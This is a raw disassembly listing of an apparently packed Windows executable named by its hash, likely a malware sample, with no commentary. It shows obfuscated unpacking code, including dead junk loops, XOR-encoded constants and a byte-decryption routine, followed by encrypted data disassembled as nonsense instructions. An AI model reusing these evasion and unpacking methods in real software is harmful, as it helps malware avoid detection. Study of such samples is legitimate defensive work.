
9568ca6326047fc24ceba825c04e2598109523e8636afa9d528ce6cf0182a609.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    DWORD PTR ds:0x42b1de,0x13
  401013:	cmp    DWORD PTR ds:0x42b1de,0x0
  40101a:	je     0x401078
  401020:	cmp    DWORD PTR ds:0x42b1de,0x7
  401027:	jb     0x401078
  40102d:	jmp    0x401050
  401032:	push   0x42a019
  401037:	push   0x564d
  40103c:	push   DWORD PTR [ebp-0x28]
  40103f:	push   0x8804
  401044:	push   DWORD PTR [ebp-0x24]
  401047:	push   DWORD PTR [ebp-0x18]
  40104a:	call   DWORD PTR ds:0x42b2ea
  401050:	cmp    DWORD PTR ds:0x42b1de,0x8
  401057:	jne    0x401068
  40105d:	mov    eax,ds:0x42b1de
  401062:	dec    eax
  401063:	mov    ds:0x42b1de,eax
  401068:	mov    eax,ds:0x42b1de
  40106d:	dec    eax
  40106e:	mov    ds:0x42b1de,eax
  401073:	jmp    0x401013
  401078:	mov    eax,DWORD PTR [ebp+0x8]
  40107b:	mov    ecx,DWORD PTR ds:0x42b1be
  401081:	add    DWORD PTR ds:0x42b22a,ecx
  401087:	push   ebx
  401088:	and    DWORD PTR ds:0x42b21e,0x0
  401092:	xor    ecx,ecx
  401094:	or     ecx,DWORD PTR ds:0x42b21e
  40109a:	inc    ecx
  40109b:	mov    DWORD PTR ds:0x42b21e,ecx
  4010a1:	cmp    DWORD PTR ds:0x42b21e,0xc
  4010a8:	ja     0x4010ef
  4010ae:	jmp    0x4010c8
  4010b3:	push   0x42a03d
  4010b8:	push   0x0
  4010ba:	push   DWORD PTR [ebp-0xc]
  4010bd:	push   0x87c3
  4010c2:	call   DWORD PTR ds:0x42b2ee
  4010c8:	cmp    DWORD PTR ds:0x42b21e,0xb
  4010cf:	jne    0x4010e2
  4010d5:	mov    ecx,DWORD PTR ds:0x42b21e
  4010db:	inc    ecx
  4010dc:	mov    DWORD PTR ds:0x42b21e,ecx
  4010e2:	cmp    DWORD PTR ds:0x42b21e,0x1b
  4010e9:	jb     0x401092
  4010ef:	push   esi
  4010f0:	push   edi
  4010f1:	mov    esi,0x75108ae
  4010f6:	mov    DWORD PTR ds:0x42b1f6,0x15
  401100:	cmp    DWORD PTR ds:0x42b1f6,0x0
  401107:	je     0x401156
  40110d:	cmp    DWORD PTR ds:0x42b1f6,0x9
  401114:	jb     0x401156
  40111a:	jmp    0x40112a
  40111f:	push   0x7250
  401124:	call   DWORD PTR ds:0x42b2f2
  40112a:	cmp    DWORD PTR ds:0x42b1f6,0xa
  401131:	jne    0x401144
  401137:	mov    ecx,DWORD PTR ds:0x42b1f6
  40113d:	dec    ecx
  40113e:	mov    DWORD PTR ds:0x42b1f6,ecx
  401144:	mov    ecx,DWORD PTR ds:0x42b1f6
  40114a:	dec    ecx
  40114b:	mov    DWORD PTR ds:0x42b1f6,ecx
  401151:	jmp    0x401100
  401156:	xor    eax,esi
  401158:	mov    edi,0x3272f5
  40115d:	dec    DWORD PTR ds:0x42b19e
  401163:	add    eax,edi
  401165:	add    DWORD PTR ds:0x42b186,edi
  40116b:	mov    DWORD PTR [ebp-0x40],eax
  40116e:	mov    eax,ds:0x42a2f2
  401173:	xor    DWORD PTR ds:0x42b1aa,0x2d22
  40117d:	mov    eax,DWORD PTR [eax]
  40117f:	mov    ecx,DWORD PTR ds:0x42b22e
  401185:	sbb    ecx,DWORD PTR ds:0x42b1fe
  40118b:	mov    DWORD PTR ds:0x42b22e,ecx
  401191:	mov    DWORD PTR [ebp-0x3c],eax
  401194:	and    DWORD PTR ds:0x42b192,0x0
  40119e:	jmp    0x4011b0
  4011a3:	mov    ecx,DWORD PTR ds:0x42b192
  4011a9:	inc    ecx
  4011aa:	mov    DWORD PTR ds:0x42b192,ecx
  4011b0:	cmp    DWORD PTR ds:0x42b192,0x15
  4011b7:	jae    0x4011f9
  4011bd:	cmp    DWORD PTR ds:0x42b192,0x8
  4011c4:	jg     0x4011f9
  4011ca:	jmp    0x4011da
  4011cf:	push   0x42b1aa
  4011d4:	call   DWORD PTR ds:0x42b2f6
  4011da:	cmp    DWORD PTR ds:0x42b192,0x7
  4011e1:	jne    0x4011f4
  4011e7:	mov    ecx,DWORD PTR ds:0x42b192
  4011ed:	inc    ecx
  4011ee:	mov    DWORD PTR ds:0x42b192,ecx
  4011f4:	jmp    0x4011a3
  4011f9:	mov    eax,ds:0x42a502
  4011fe:	xor    DWORD PTR ds:0x42b182,0x12c5
  401208:	mov    eax,DWORD PTR [eax]
  40120a:	mov    DWORD PTR [ebp-0x1c],eax
  40120d:	mov    DWORD PTR ds:0x42b1da,0x1a
  401217:	cmp    DWORD PTR ds:0x42b1da,0x0
  40121e:	je     0x40127b
  401224:	cmp    DWORD PTR ds:0x42b1da,0x8
  40122b:	jl     0x40127b
  401231:	jmp    0x401250
  401236:	push   0x42b1ba
  40123b:	push   0x42b1d2
  401240:	push   0x8af3
  401245:	push   0x42a12c
  40124a:	call   DWORD PTR ds:0x42b2fa
  401250:	cmp    DWORD PTR ds:0x42b1da,0x9
  401257:	jne    0x40126b
  40125d:	xor    eax,eax
  40125f:	or     eax,DWORD PTR ds:0x42b1da
  401265:	dec    eax
  401266:	mov    ds:0x42b1da,eax
  40126b:	mov    eax,ds:0x42b1da
  401270:	dec    eax
  401271:	mov    ds:0x42b1da,eax
  401276:	jmp    0x401217
  40127b:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401282:	mov    eax,DWORD PTR [ebp-0x34]
  401285:	xor    eax,esi
  401287:	xor    DWORD PTR ds:0x42b222,edi
  40128d:	add    eax,edi
  40128f:	or     ecx,DWORD PTR ds:0x42b222
  401295:	mov    DWORD PTR [ebp-0x40],eax
  401298:	adc    ecx,DWORD PTR ds:0x42b19a
  40129e:	mov    eax,ds:0x42a472
  4012a3:	xor    DWORD PTR ds:0x42b1d6,0x6afc
  4012ad:	mov    DWORD PTR [ebp-0x40],eax
  4012b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4012b3:	mov    DWORD PTR [ebp-0x14],eax
  4012b6:	adc    eax,0x46d9
  4012bb:	mov    eax,DWORD PTR [ebp-0x14]
  4012be:	and    DWORD PTR ds:0x42b222,0x0
  4012c8:	jmp    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x42b222
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x42b222,ecx
  4012da:	cmp    DWORD PTR ds:0x42b222,0x1c
  4012e1:	jae    0x401328
  4012e7:	cmp    DWORD PTR ds:0x42b222,0x5
  4012ee:	jg     0x401328
  4012f4:	jmp    0x401309
  4012f9:	push   0x42b1e2
  4012fe:	push   0x42a2a1
  401303:	call   DWORD PTR ds:0x42b2fe
  401309:	cmp    DWORD PTR ds:0x42b222,0x4
  401310:	jne    0x401323
  401316:	mov    ecx,DWORD PTR ds:0x42b222
  40131c:	inc    ecx
  40131d:	mov    DWORD PTR ds:0x42b222,ecx
  401323:	jmp    0x4012cd
  401328:	push   0x4
  40132a:	or     DWORD PTR ds:0x42b186,0x3485
  401334:	pop    ecx
  401335:	and    DWORD PTR ds:0x42b206,0x42b1ee
  40133f:	sub    ecx,eax
  401341:	dec    eax
  401342:	add    ecx,DWORD PTR [ebp-0x1c]
  401345:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  40134c:	adc    DWORD PTR ds:0x42b20e,0x42b1e2
  401356:	mov    DWORD PTR [ebp-0x18],ecx
  401359:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  401363:	or     DWORD PTR ds:0x42b182,0x6f89
  40136d:	mov    eax,DWORD PTR [ebp-0x14]
  401370:	xor    DWORD PTR ds:0x42b20e,0x6cd3
  40137a:	mov    DWORD PTR [ebp-0x9c],eax
  401380:	adc    eax,DWORD PTR ds:0x42b196
  401386:	mov    eax,DWORD PTR [ebp-0x18]
  401389:	and    DWORD PTR ds:0x42b22a,0x42b226
  401393:	mov    DWORD PTR [ebp-0x98],eax
  401399:	xor    DWORD PTR ds:0x42b186,ecx
  40139f:	mov    eax,DWORD PTR [ebp-0x2c]
  4013a2:	adc    DWORD PTR ds:0x42b1f6,0x42b22a
  4013ac:	xor    eax,esi
  4013ae:	add    eax,edi
  4013b0:	add    DWORD PTR ds:0x42b22e,0x47bc
  4013ba:	mov    DWORD PTR [ebp-0x94],eax
  4013c0:	and    DWORD PTR ds:0x42b20e,0x42b202
  4013ca:	lea    eax,[ebp-0x48]
  4013cd:	mov    DWORD PTR [ebp-0x90],eax
  4013d3:	add    eax,0x2eac
  4013d8:	mov    eax,DWORD PTR [ebp-0xa0]
  4013de:	xor    eax,esi
  4013e0:	sub    DWORD PTR ds:0x42b20e,0x42b1f6
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0xa0],eax
  4013f2:	inc    DWORD PTR ds:0x42b1ce
  4013f8:	lea    eax,[ebp-0xa0]
  4013fe:	add    DWORD PTR ds:0x42b1a6,0x42b21a
  401408:	push   eax
  401409:	sub    DWORD PTR ds:0x42b1fe,ebx
  40140f:	mov    eax,DWORD PTR [ebp+0xc]
  401412:	and    DWORD PTR ds:0x42b226,0xfdc
  40141c:	xor    eax,esi
  40141e:	add    eax,edi
  401420:	push   eax
  401421:	and    DWORD PTR ds:0x42b192,ecx
  401427:	mov    eax,ds:0x42a492
  40142c:	sub    DWORD PTR ds:0x42b1f6,0x42b1c6
  401436:	push   0x42a3e8
  40143b:	and    DWORD PTR ds:0x42b1c2,0x42b19e
  401445:	push   DWORD PTR [eax]
  401447:	call   0x4061fa
  40144c:	mov    ebx,DWORD PTR ds:0x42b226
  401452:	add    ebx,DWORD PTR ds:0x42b19a
  401458:	mov    DWORD PTR ds:0x42b226,ebx
  40145e:	mov    ebx,DWORD PTR [ebp-0x14]
  401461:	adc    edx,DWORD PTR ds:0x42b1da
  401467:	mov    eax,DWORD PTR [ebp-0x18]
  40146a:	and    DWORD PTR ds:0x42b1f2,0x0
  401474:	mov    edx,DWORD PTR ds:0x42b1f2
  40147a:	inc    edx
  40147b:	mov    DWORD PTR ds:0x42b1f2,edx
  401481:	cmp    DWORD PTR ds:0x42b1f2,0x8
  401488:	ja     0x4014d0
  40148e:	jmp    0x4014a9
  401493:	push   DWORD PTR [ebp-0x10]
  401496:	push   DWORD PTR [ebp-0x28]
  401499:	push   0x42a223
  40149e:	push   0x400000
  4014a3:	call   DWORD PTR ds:0x42b306
  4014a9:	cmp    DWORD PTR ds:0x42b1f2,0x7
  4014b0:	jne    0x4014c3
  4014b6:	mov    edx,DWORD PTR ds:0x42b1f2
  4014bc:	inc    edx
  4014bd:	mov    DWORD PTR ds:0x42b1f2,edx
  4014c3:	cmp    DWORD PTR ds:0x42b1f2,0x1e
  4014ca:	jb     0x401474
  4014d0:	mov    DWORD PTR [ebp-0x58],eax
  4014d3:	or     DWORD PTR ds:0x42b1ce,edi
  4014d9:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  4014e0:	sub    DWORD PTR ds:0x42b1f2,0x209f
  4014ea:	mov    eax,0xf89c85a3
  4014ef:	sbb    DWORD PTR ds:0x42b21a,0x6d23
  4014f9:	mov    DWORD PTR [ebp-0x1c],eax
  4014fc:	sub    DWORD PTR ds:0x42b206,ebx
  401502:	lea    ecx,[eax+0x2]
  401505:	adc    edx,0x42c6
  40150b:	mov    DWORD PTR [ebp-0x28],ecx
  40150e:	inc    edx
  40150f:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  401516:	or     edx,DWORD PTR ds:0x42b182
  40151c:	mov    DWORD PTR [ebp-0x8],eax
  40151f:	mov    edx,DWORD PTR ds:0x42b256
  401525:	xor    eax,eax
  401527:	xor    eax,DWORD PTR ds:0x42b276
  40152d:	sub    edx,eax
  40152f:	sub    edx,DWORD PTR [edx+eax*1]
  401532:	mov    eax,DWORD PTR [ebp-0x10]
  401535:	xor    DWORD PTR ds:0x42b1b2,edi
  40153b:	xor    eax,esi
  40153d:	sub    DWORD PTR ds:0x42b1be,ecx
  401543:	mov    edx,0xffcd8d8b
  401548:	sbb    DWORD PTR ds:0x42b182,0x343
  401552:	sub    edx,eax
  401554:	mov    DWORD PTR [ebp-0xc],edx
  401557:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40155e:	mov    eax,DWORD PTR [ebp-0x8]
  401561:	mov    DWORD PTR ds:0x42b216,0x6ef4
  40156b:	mov    DWORD PTR [ebp-0x3c],ebx
  40156e:	mov    DWORD PTR ds:0x42b206,0x4694
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x42b21e,0x4f34
  401584:	je     0x401870
  40158a:	or     eax,DWORD PTR ds:0x42b22e
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	and    DWORD PTR ds:0x42b21a,0x0
  40159d:	jmp    0x4015af
  4015a2:	mov    ecx,DWORD PTR ds:0x42b21a
  4015a8:	inc    ecx
  4015a9:	mov    DWORD PTR ds:0x42b21a,ecx
  4015af:	cmp    DWORD PTR ds:0x42b21a,0x1b
  4015b6:	jae    0x4015e4
  4015bc:	cmp    DWORD PTR ds:0x42b21a,0x1c
  4015c3:	jb     0x4015e4
  4015c9:	jmp    0x4015df
  4015ce:	push   0x42a211
  4015d3:	push   DWORD PTR [ebp-0x1c]
  4015d6:	push   DWORD PTR [ebp-0x14]
  4015d9:	call   DWORD PTR ds:0x42b30e
  4015df:	jmp    0x4015a2
  4015e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4015e7:	adc    DWORD PTR ds:0x42b196,0x5f31
  4015f1:	xor    eax,esi
  4015f3:	xor    ecx,esi
  4015f5:	or     DWORD PTR ds:0x42b1d6,0x22e1
  4015ff:	lea    ecx,[eax+ecx*1+0x64e5ea]
  401606:	mov    eax,ds:0x42b186
  40160b:	xor    DWORD PTR ds:0x42b1ee,eax
  401611:	mov    eax,DWORD PTR [ebp-0xc]
  401614:	xor    edx,edx
  401616:	xor    DWORD PTR ds:0x42b212,0x42b202
  401620:	div    ecx
  401622:	mov    eax,DWORD PTR [ebp-0x8]
  401625:	sub    DWORD PTR ds:0x42b192,edi
  40162b:	mov    ecx,DWORD PTR [ebp-0x10]
  40162e:	xor    eax,esi
  401630:	add    DWORD PTR ds:0x42b1c6,0x2cb7
  40163a:	xor    ecx,esi
  40163c:	sub    eax,ecx
  40163e:	mov    DWORD PTR ds:0x42b21a,0x2b73
  401648:	cmp    edx,eax
  40164a:	mov    DWORD PTR ds:0x42b21e,0x4704
  401654:	jne    0x40181a
  40165a:	mov    eax,DWORD PTR [ebp-0xc]
  40165d:	xor    ecx,0x1cf0
  401663:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  40166a:	mov    eax,DWORD PTR [ebp-0x28]
  40166d:	add    DWORD PTR ds:0x42b1ce,0x4d15
  401677:	mov    ecx,DWORD PTR [ebp-0x18]
  40167a:	or     DWORD PTR ds:0x42b18e,0x42b1ea
  401684:	xor    eax,esi
  401686:	add    DWORD PTR ds:0x42b18e,0x42b182
  401690:	xor    ecx,esi
  401692:	or     DWORD PTR ds:0x42b21a,0x42b1aa
  40169c:	add    eax,edi
  40169e:	adc    DWORD PTR ds:0x42b1e2,0x3afa
  4016a8:	add    ecx,edi
  4016aa:	mov    BYTE PTR [ebp-0x21],dl
  4016ad:	cmp    eax,ecx
  4016af:	jae    0x4017e8
  4016b5:	and    DWORD PTR ds:0x42b1fe,0x0
  4016bf:	mov    edx,DWORD PTR ds:0x42b1fe
  4016c5:	inc    edx
  4016c6:	mov    DWORD PTR ds:0x42b1fe,edx
  4016cc:	cmp    DWORD PTR ds:0x42b1fe,0x27
  4016d3:	ja     0x4016f6
  4016d9:	jmp    0x4016e9
  4016de:	push   0x18bf
  4016e3:	call   DWORD PTR ds:0x42b316
  4016e9:	cmp    DWORD PTR ds:0x42b1fe,0x18
  4016f0:	jb     0x4016bf
  4016f6:	lea    ecx,[eax-0x3272f5]
  4016fc:	adc    DWORD PTR ds:0x42b19e,0x3c59
  401706:	mov    DWORD PTR [ebp-0x14],ecx
  401709:	mov    edx,DWORD PTR [ebp-0x14]
  40170c:	xor    edx,esi
  40170e:	add    DWORD PTR ds:0x42b192,0x42b1fa
  401718:	add    edx,0x7f55d8e3
  40171e:	lea    ecx,[ebp+eax*4-0xb4]
  401725:	mov    DWORD PTR ds:0x42b1ca,0x6fb0
  40172f:	mov    DWORD PTR [ecx],edx
  401731:	mov    edx,DWORD PTR [ecx]
  401733:	cmp    edx,0x244ecb80
  401739:	mov    DWORD PTR ds:0x42b1e2,0xbe5
  401743:	jbe    0x40175e
  401749:	add    DWORD PTR [ecx],0x405fcc1
  40174f:	mov    DWORD PTR ds:0x42b1ca,0x62ff
  401759:	jmp    0x401764
  40175e:	add    DWORD PTR [ecx],0xfdaf433f
  401764:	sbb    DWORD PTR ds:0x42b1c2,0x1be5
  40176e:	mov    ecx,DWORD PTR [ebp-0x18]
  401771:	xor    DWORD PTR ds:0x42b1c6,0x42b18e
  40177b:	xor    ecx,esi
  40177d:	xor    DWORD PTR ds:0x42b1f6,0x42b192
  401787:	inc    eax
  401788:	inc    DWORD PTR [ebp-0x14]
  40178b:	adc    DWORD PTR ds:0x42b1b2,0x7e0f
  401795:	add    ecx,edi
  401797:	cmp    eax,ecx
  401799:	jb     0x401709
  40179f:	mov    DWORD PTR ds:0x42b192,0x13
  4017a9:	cmp    DWORD PTR ds:0x42b192,0x0
  4017b0:	je     0x4017e5
  4017b6:	cmp    DWORD PTR ds:0x42b192,0x20
  4017bd:	jl     0x4017e5
  4017c3:	jmp    0x4017d5
  4017c8:	push   0xd
  4017ca:	push   0x57ae
  4017cf:	call   DWORD PTR ds:0x42b31a
  4017d5:	mov    eax,ds:0x42b192
  4017da:	dec    eax
  4017db:	mov    ds:0x42b192,eax
  4017e0:	jmp    0x4017a9
  4017e5:	mov    dl,BYTE PTR [ebp-0x21]
  4017e8:	mov    eax,ds:0x42b226
  4017ed:	sub    eax,DWORD PTR ds:0x42b1ce
  4017f3:	mov    ds:0x42b226,eax
  4017f8:	mov    eax,DWORD PTR [ebp-0x34]
  4017fb:	xor    al,0xae
  4017fd:	mov    cl,0xb
  4017ff:	sub    cl,al
  401801:	add    dl,cl
  401803:	mov    ecx,DWORD PTR [ebp-0x1c]
  401806:	xor    cl,0xae
  401809:	sub    cl,0xb
  40180c:	ror    dl,cl
  40180e:	xor    eax,eax
  401810:	mov    eax,DWORD PTR [ebp-0xc]
  401813:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  40181a:	mov    eax,DWORD PTR [ebp-0xc]
  40181d:	mov    ecx,DWORD PTR [ebp-0x28]
  401820:	sub    eax,edi
  401822:	xor    eax,esi
  401824:	cmp    eax,ecx
  401826:	jne    0x401850
  40182c:	mov    eax,DWORD PTR [ebp-0x8]
  40182f:	mov    ecx,DWORD PTR [ebp-0x10]
  401832:	xor    eax,esi
  401834:	xor    ecx,esi
  401836:	sub    eax,ecx
  401838:	sub    eax,edi
  40183a:	xor    eax,esi
  40183c:	mov    DWORD PTR [ebp-0x8],eax
  40183f:	mov    eax,DWORD PTR [ebp-0x10]
  401842:	xor    eax,esi
  401844:	mov    ecx,0xffcd8d8b
  401849:	sub    ecx,eax
  40184b:	jmp    0x40185f
  401850:	mov    eax,DWORD PTR [ebp-0x10]
  401853:	xor    eax,esi
  401855:	mov    ecx,0xffcd8d0b
  40185a:	sub    ecx,eax
  40185c:	add    ecx,DWORD PTR [ebp-0xc]
  40185f:	mov    DWORD PTR [ebp-0xc],ecx
  401862:	mov    eax,DWORD PTR [ebp-0x8]
  401865:	cmp    eax,0xf89c85a5
  40186a:	jne    0x40158a
  401870:	mov    DWORD PTR [ebp-0x34],0x9
  401877:	mov    ecx,DWORD PTR [ebp+0x8]
  40187a:	xor    ecx,esi
  40187c:	add    ecx,edi
  40187e:	jmp    0x406188
  401883:	lea    eax,[ecx+ebx*1]
  401886:	mov    DWORD PTR [ebp-0x2c],eax
  401889:	mov    eax,DWORD PTR [ebp-0x58]
  40188c:	sub    eax,ecx
  40188e:	mov    DWORD PTR [ebp-0x1c],eax
  401891:	mov    eax,DWORD PTR [ebp-0x1c]
  401894:	mov    DWORD PTR [ebp-0x14],eax
  401897:	mov    eax,DWORD PTR [ebp-0x2c]
  40189a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4018a1:	mov    DWORD PTR [ebp-0x54],eax
  4018a4:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  4018ab:	mov    eax,DWORD PTR [ebp-0x38]
  4018ae:	xor    eax,esi
  4018b0:	add    eax,edi
  4018b2:	mov    DWORD PTR [ebp-0x10],eax
  4018b5:	mov    eax,DWORD PTR [ebp-0x38]
  4018b8:	xor    eax,esi
  4018ba:	add    eax,edi
  4018bc:	mov    DWORD PTR [ebp-0x8],eax
  4018bf:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4018c6:	jmp    0x403c1b
  4018cb:	mov    al,0x2a
  4018cd:	dec    ecx
  4018ce:	and    ebp,eax
  4018d0:	adc    ch,BYTE PTR [eax-0x7dd88776]
  4018d6:	push   esi
  4018d7:	and    cl,BYTE PTR [esi-0x7c7c9181]
  4018dd:	add    DWORD PTR [ebx-0x7c7ca1b5],0x28
  4018e4:	xor    DWORD PTR [esi],esp
  4018e6:	cmp    al,0x24
  4018e8:	cmp    BYTE PTR [edx],ah
  4018ea:	cs js  0x401928
  4018ed:	je     0x401966
  4018ef:	add    BYTE PTR [ecx+0x70],dh
  4018f2:	jae    0x401964
  4018f4:	dec    ebx
  4018f5:	fsub   st,st(1)
  4018f7:	cld    
  4018f8:	ins    DWORD PTR es:[edi],dx
  4018f9:	push   ebp
  4018fa:	jb     0x401978
  4018fc:	bound  ebp,QWORD PTR [ebp-0x319b8f83]
  401902:	pusha  
  401903:	push   ebx
  401904:	cmp    eax,0x87960391
  401909:	push   ax
  40190b:	jle    0x401953
  40190d:	lea    esi,[edi+0x42bbbd7e]
  401913:	xor    esi,edi
  401915:	ja     0x4018f8
  401917:	add    ebp,DWORD PTR [edx+0x7e]
  40191a:	pop    ds
  40191b:	lock inc esp
  40191d:	rol    bl,1
  40191f:	lock xchg esi,eax
  401921:	sub    bl,bh
  401923:	xchg   edx,eax
  401924:	xor    al,0xe
  401926:	fs mov dl,0x93
  401929:	fld    DWORD PTR [esi]
  40192b:	jo     0x40190d
  40192d:	sbb    ecx,ebp
  40192f:	lsl    esi,WORD PTR [edi]
  401932:	and    eax,0x72371155
  401937:	jne    0x4018fd
  401939:	scas   al,BYTE PTR es:[edi]
  40193a:	sub    bl,BYTE PTR [eax+ebx*1-0x49]
  40193e:	(bad)  
  40193f:	hlt    
  401940:	push   esp
  401941:	xor    cl,BYTE PTR [ecx+0x462d54b]
  401947:	and    eax,DWORD PTR [ebx]
  401949:	test   DWORD PTR [edx+edi*2-0x6da15a20],edi
  401950:	mov    esp,0x4c9b2916
  401955:	or     bl,BYTE PTR [edi+0x128a8b41]
  40195b:	jecxz  0x40198d
  40195d:	imul   edx,DWORD PTR [eax-0x596b5b7],0xffffffce
  401964:	xchg   ebx,eax
  401965:	xor    al,0x94
  401967:	int    0xc6
  401969:	rcl    DWORD PTR [ebp+0x6b58f96c],1
  40196f:	push   ecx
  401970:	adc    DWORD PTR [edi],edi
  401972:	or     al,BYTE PTR [edi+0x1a]
  401975:	mov    al,0x52
  401977:	shl    DWORD PTR [esi+0x6719dd4d],cl
  40197d:	add    BYTE PTR [ebx+0x67],ch
  401980:	mov    eax,0x5be7504
  401985:	pop    ebx
  401986:	sbb    eax,DWORD PTR [esi]
  401988:	add    ecx,edi
  40198a:	jb     0x401983
  40198c:	jns    0x401942
  40198e:	(bad)  
  40198f:	ffreep st(1)
  401991:	in     eax,0x33
  401993:	mov    al,ds:0x6f299f82
  401998:	idiv   edx
  40199a:	leave  
  40199b:	and    al,0xb6
  40199d:	stos   DWORD PTR es:[edi],eax
  40199e:	mov    eax,ds:0x8ecf1dd1
  4019a3:	or     DWORD PTR [ecx+edx*4],edx
  4019a6:	out    0x19,al
  4019a8:	xchg   ebx,eax
  4019a9:	fistp  WORD PTR [edi-0x2c]
  4019ac:	jns    0x401a28
  4019ae:	aas    
  4019af:	jecxz  0x4019e6
  4019b1:	cmc    
  4019b2:	and    DWORD PTR [ebx+eiz*8],ecx
  4019b5:	imul   esi
  4019b7:	ds jb  0x401a34
  4019ba:	out    dx,al
  4019bb:	je     0x401989
  4019bd:	clc    
  4019be:	xlat   BYTE PTR ds:[ebx]
  4019bf:	xchg   esi,eax
  4019c0:	dec    esp
  4019c1:	mov    ds:0xc6a7b94f,eax
  4019c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019c7:	push   edi
  4019c8:	jmp    0x3ea7d6f5
  4019cd:	xor    ebx,esp
  4019cf:	bound  esp,QWORD PTR [ebp+0x6c]
  4019d2:	pop    esp
  4019d3:	or     BYTE PTR ss:[edx],0xe7
  4019d7:	or     ebx,DWORD PTR [edi+0x5]
  4019da:	jns    0x401a0f
  4019dc:	xchg   esi,eax
  4019dd:	pop    ebx
  4019de:	and    BYTE PTR [ebx+0x24],dl
  4019e1:	outs   dx,DWORD PTR ds:[esi]
  4019e2:	cmp    ch,BYTE PTR [ebp+0x3d]
  4019e5:	sub    ch,BYTE PTR [ecx+0x12]
  4019e8:	pop    ebx
  4019e9:	test   ah,dl
  4019eb:	add    al,0x13
  4019ed:	jmp    0xb8e869a5
  4019f2:	push   edi
  4019f3:	imul   DWORD PTR [ecx+0x4988799d]
  4019f9:	or     DWORD PTR [edi-0x43076d2],edi
  4019ff:	(bad)  [bx+di+0x66d7]
  401a04:	mov    bh,0xe3
  401a06:	dec    esp
  401a07:	mov    ah,0xca
  401a09:	out    0x3f,eax
  401a0b:	and    eax,0x5e77f37b
  401a10:	(bad)  [ecx+0x56]
  401a13:	cli    
  401a14:	inc    edx
  401a15:	mov    cs,WORD PTR [esi+0x4b]
  401a18:	lock mov ss,edx
  401a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a1d:	mov    ecx,0x519ef561
  401a22:	js     0x401a0a
  401a24:	mov    ecx,0x1783cd29
  401a29:	inc    esp
  401a2a:	in     al,dx
  401a2b:	jp     0x401a62
  401a2d:	shr    BYTE PTR [esi+0xbb5f681],0xdb
  401a34:	fwait
  401a35:	add    eax,0x6932235
  401a3a:	push   ebx
  401a3b:	aaa    
  401a3c:	(bad)  
  401a3d:	and    DWORD PTR [esp+edx*2-0x9],esp
  401a41:	call   0xd4aa:0xc377c56f
  401a48:	inc    eax
  401a49:	pop    edx
  401a4a:	xor    edi,DWORD PTR [edx+0xccb5412]
  401a50:	lahf   
  401a51:	push   ss
  401a52:	push   esi
  401a53:	xchg   ebx,eax
  401a54:	stc    
  401a55:	cmp    ch,BYTE PTR [esi-0x7107f64e]
  401a5b:	sbb    al,BYTE PTR ds:0xb80b845a
  401a61:	int3   
  401a62:	inc    ecx
  401a63:	iret   
  401a64:	jge    0x401a66
  401a66:	retf   
  401a67:	push   0x9ad0a6e2
  401a6c:	fist   DWORD PTR [esi+0x25019296]
  401a72:	jp     0x401a5c
  401a74:	xor    eax,0x61df259c
  401a79:	pop    ebx
  401a7a:	or     bl,bl
  401a7c:	push   esi
  401a7d:	jmp    0xe69ee1a2
  401a82:	xchg   eax,edi
  401a84:	mov    ds:0x41c01cda,al
  401a89:	add    ah,BYTE PTR [ebp+0x4d]
  401a8c:	and    cl,BYTE PTR [edx-0x7c126972]
  401a92:	aaa    
  401a93:	pop    ecx
  401a94:	test   DWORD PTR [ebx+0x7d],edi
  401a97:	aad    0xc1
  401a99:	(bad)
  401a9e:	xor    eax,0x97f2dca6
  401aa3:	not    dl
  401aa5:	pushf  
  401aa6:	jne    0x401a82
  401aa8:	sti    
  401aa9:	jns    0x401a69
  401aab:	mov    ebx,0x4c88e0de
  401ab0:	loopne 0x401a4c
  401ab2:	adc    al,0x34
  401ab4:	stc    
  401ab5:	sub    BYTE PTR [esi],0x4
  401ab8:	push   ecx
  401ab9:	cld    
  401aba:	in     eax,0xb8
  401abc:	cmp    DWORD PTR [ebx+0x23],edi
  401abf:	stos   BYTE PTR es:[edi],al
  401ac0:	sbb    cl,bh
  401ac2:	mov    edi,0x45601d24
  401ac7:	rol    DWORD PTR [edi-0x3d4e61e8],1
  401acd:	xchg   DWORD PTR [edx],esi
  401acf:	jae    0x401a54
  401ad1:	cmp    BYTE PTR fs:[esp+edx*1],bl
  401ad5:	fidiv  WORD PTR [eax-0x2c7b8dd9]
  401adb:	je     0x401ac3
  401add:	and    DWORD PTR [edx],0x58
  401ae0:	or     BYTE PTR [ebx+eax*1],dh
  401ae3:	inc    edi
  401ae4:	lock add eax,0xeda14f33
  401aea:	inc    edx
  401aeb:	call   0x185b96da
  401af0:	rcr    BYTE PTR [edi-0x68],1
  401af3:	das    
  401af4:	sub    esi,DWORD PTR [ecx]
  401af6:	in     al,0x70
  401af8:	adc    ebp,DWORD PTR [edi+0x48]
  401afb:	push   ss
  401afc:	shl    BYTE PTR [edi],0x9a
  401aff:	sbb    eax,0xb00bb54e
  401b04:	addr16 jl 0x401ac1
  401b07:	mov    eax,0xf46c82e0
  401b0c:	or     DWORD PTR [eax+0x7c22625b],ebp
  401b12:	(bad)  
  401b13:	ins    DWORD PTR es:[edi],dx
  401b14:	adc    BYTE PTR [esi],cl
  401b16:	jne    0x401b31
  401b18:	scas   al,BYTE PTR es:[edi]
  401b19:	std    
  401b1a:	aaa    
  401b1b:	jmp    0x59a6:0x4d44096
